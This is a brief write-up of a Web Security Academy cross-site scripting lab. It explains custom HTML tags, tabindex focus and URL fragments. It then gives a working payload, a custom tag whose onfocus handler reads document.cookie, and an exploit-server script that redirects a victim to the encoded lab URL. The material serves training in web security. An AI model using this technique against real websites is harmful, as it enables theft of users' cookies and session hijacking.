
---
Users don't have to define `custom-tag` unless it has special purpose, because HTML will only construct an element node and  DOM, when seeing `tag` it won't parse the tags.

Only certain types of elements can be focus. Like form input, we can often cycle thorough form inputs using `TAB` when `tabindex="1"`.

```
https://example.com/page#x
```

#x is called fragment (hash), it will only exist in the browser side, often use to locate some certain element in the page.

```html
<custom-tag onfocus='alert(document.cookie)' id='x' tabindex="1">
```

Response Body in exploit server

```html
<script>
location='https://0af4005a03e2a23b80ae031500480055.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3D%27alert(document.cookie)%27+id%3D%27x%27+tabindex%3D%221%22%3E#x'
</script>
```

